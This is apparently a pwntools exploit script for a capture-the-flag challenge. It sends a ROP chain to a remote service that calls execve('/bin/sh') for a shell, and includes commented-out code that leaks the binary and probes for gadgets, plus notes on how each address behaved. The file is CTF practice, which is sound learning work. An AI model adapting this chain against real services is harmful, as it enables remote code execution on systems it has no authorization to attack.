import sys
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# Remote
IP = 'university.opentoallctf.com'
PORT = 30005

stop_gadget = 0x40011f

# Pop Gadgets
pop_rax = 0x400113
pop_rdi = 0x400115
pop_rsi = 0x400117
pop_rdx = 0x400119

write_addr =  0x40015a # 142, 15a, 170 asks for input but then timeouts.

current_addr = 0x400000
binary = ''

p = remote(IP, PORT)
p.recvuntil('Give me some data:\n')
buf = 'aaaabbbb'
buf += p64(pop_rax) + p64(59) # syscall execve
buf += p64(pop_rdi) + p64(0x40018f) # &'/bin/sh'
buf += p64(pop_rsi) + p64(0) # rsi
buf += p64(pop_rdx) + p64(0) # rdx
buf += p64(0x400110) # syscall
p.sendline(buf)
p.interactive()

# while current_addr < 0x400600:

# 	p = remote(IP, PORT)
# 	p.recvuntil('Give me some data:\n')
# 	buf = 'aaaabbbb'
# 	buf += p64(pop_rax) + p64(1) # syscall_1 : write
# 	buf += p64(pop_rdi) + p64(1) # stdout
# 	buf += p64(pop_rsi) + p64(current_addr) # buffer
# 	buf += p64(pop_rdx) + p64(200) # 200 bytes
# 	buf += p64(write_addr)
# 	p.sendline(buf)
# 	binary += p.recvn(0xc8)
# 	current_addr += 0xc8
# 	p.close()

# with open('challenge', 'wb') as fout:
# 	fout.write(binary)

# if True:
# # while probe < 0x400300:
# 	print('Trying: {}:'.format(hex(probe)))

# 	p = remote(IP, PORT)
# 	p.recvuntil('Give me some data:\n')
# 	buf = 'aaaabbbb'
# 	buf += p64(pop_rdx) + p64(200)
# 	buf += p64(pop_rdi) + p64(5)
# 	buf += p64(write_addr)
# 	# buf += p64(pop_rsi) + p64(pop_rdx)
# 	# buf += p64(probe)
# 	p.sendline(buf)
# 	p.interactive()
# 	probe += 1
# 	p.close()

'''
	output = p.recvline()

	if 'timeout' not in output:
		print('----------------------------------------------')
		print('Potential gadget! {}'.format(hex(probe)))
		print('----------------------------------------------')

	p.close()
	probe += 1
'''









'''
if len(sys.argv) > 1 and sys.argv[1] == '--justone':
	print('Trying {}:'.format(hex(probe)))
	p = remote(IP, PORT)
	print p.recvuntil('Give me some data:\n')
	p.sendline('aaaabbbb' + p64(0x40011f) + p64(0x400142) + p64(stop_gadget))
	# p.sendline('aaaabbbb' + p64(probe) + p64(probe * 1024) + 'ccccdddd' * 2)
	p.interactive()
else:
'''

# Known addresses
'''
------------------------------------------
Round One - Just return address
------------------------------------------
0x40011f - Displays prompt and asks for input again and echos
0x400128 - No prompt, just asks for input again and echos
0x400129 - No prompt, just asks for input again and echos
0x40012e - No prompt, just asks for input again and echos
0x400133 - No prompt, just asks for input again and echos
0x400134 - No prompt, just asks for input again. No echo.
0x400136 - No prompt, just asks for input again. No echo.
0x400138 - No prompt, just asks for input again. No echo.
0x40013d - No prompt, just asks for input again. No echo.
0x400142 - NO RET: Probe is changed to .. 4f. Initial 8 bytes of buffer are overwritten with an address. Calls write with addr buff - 8.
0x400143 - Just exits.
0x400145 - Just exits.
0x400147 - Just exits.
0x400148 - Just exits.
0x40014a - Just exits.
...
0x40014f - Just exits.

------------------------------------------
Round Two - Return address with stop gadget
------------------------------------------
0x400110
0x400111
0x400112
0x400113
0x400114
0x400115
0x400116
0x400117
0x400118
0x400119
0x40011a
0x40011b
0x40011f


Have two pops
11b
11f

'''
